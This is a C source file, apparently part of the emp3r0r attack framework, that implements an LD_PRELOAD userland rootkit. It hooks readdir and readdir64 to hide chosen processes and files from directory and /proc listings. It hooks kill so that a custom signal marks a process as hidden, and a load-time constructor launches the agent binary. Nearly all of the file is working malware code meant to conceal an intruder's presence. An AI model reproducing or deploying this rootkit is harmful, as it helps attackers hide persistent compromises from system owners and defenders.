#define _GNU_SOURCE
#include "libemp3r0r.h"
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

// trim trailing whitespace from a string
void trim_str(char* buffer)
{
    buffer[strcspn(buffer, "\r\n")] = 0;
}

// check if this pid is present in /dev/shm/emp PID list
int is_hidden(const char* pid)
{
    FILE* fd = fopen(SHM_FILE, "r");
    int bufferLength = 255;
    char buffer[bufferLength];
    while (fgets(buffer, bufferLength, fd)) {
        trim_str(buffer);
        if (strncmp(pid, buffer, strlen(pid)) == 0) {
            return 1;
        }
    }
    return 0;
}

// Get a directory name given a DIR* handle
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if (fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

DIR* opendir(const char* name)
{
    static DIR* (*orig_opendir)(const char*) = NULL;
    if (!orig_opendir)
        orig_opendir = dlsym(RTLD_NEXT, "opendir");

    DIR* result = orig_opendir(name);

    return result;
}

struct dirent64* readdir64(DIR* dirp)
{
    static struct dirent64* (*orig_readdir64)(DIR * dirp) = NULL;
    if (!orig_readdir64)
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64* result = NULL;
    DIR* proc_1 = opendir("/proc/1");
    struct dirent64* temp = orig_readdir64(proc_1);

    char pwd[1024];
    if (get_dir_name(dirp, pwd, 1024)) {
        result = orig_readdir64(dirp);
        if (!result) {
            closedir(proc_1);
            return NULL;
        }
        if (strcmp(pwd, "/proc") == 0) {
            if (is_hidden(result->d_name)) {
                printf("HIT pid %s", result->d_name);
                closedir(proc_1);
                return temp;
            }
        }
        if (strstr(result->d_name, HIDE_ME)) {
            closedir(proc_1);
            return temp;
        }
    }

    closedir(proc_1);
    return result;
}

struct dirent* readdir(DIR* dirp)
{
    static struct dirent* (*orig_readdir)(DIR * dirp) = NULL;
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent* result = NULL;
    DIR* proc_1 = opendir("/proc/1");
    struct dirent* temp = orig_readdir(proc_1);

    char pwd[1024];
    if (get_dir_name(dirp, pwd, 1024)) {
        result = orig_readdir(dirp);
        if (!result) {
            closedir(proc_1);
            return NULL;
        }
        if (strcmp(pwd, "/proc") == 0) {
            if (is_hidden(result->d_name)) {
                printf("HIT pid %s\n", result->d_name);
                closedir(proc_1);
                return temp;
            }
        }
        if (strstr(result->d_name, HIDE_ME)) {
            closedir(proc_1);
            return temp;
        }
    }

    closedir(proc_1);
    return result;
}

void add_hide_pid(char* pid)
{
    fwrite(pid, 1, sizeof(pid), SHM_FD);
}

FILE* open_ramfs(void)
{
    FILE* fd;
    fd = fopen64(SHM_FILE, "a+");
    return fd;
}

int kill(pid_t pid, int sig)
{
    static int (*orig_kill)(pid_t pid, int sig) = NULL;
    if (!orig_kill)
        orig_kill = dlsym(RTLD_NEXT, "kill");

    char pid_s[256];
    if (!snprintf(pid_s, sizeof(pid_s), "%d", pid)) {
        return orig_kill(pid, sig);
    }

    switch (sig) {
    case SIGINVIS:
        add_hide_pid(pid_s);
        break;
    default:
        return orig_kill(pid, sig);
    }

    return 0;
}

void __attribute__((constructor)) initLibrary(void)
{
    if (!SHM_FD)
        SHM_FD = open_ramfs();

    execlp("sh", "-c", EmpPATH, (char*)0);
}

void __attribute__((destructor)) cleanUpLibrary(void)
{
    fclose(SHM_FD);
}
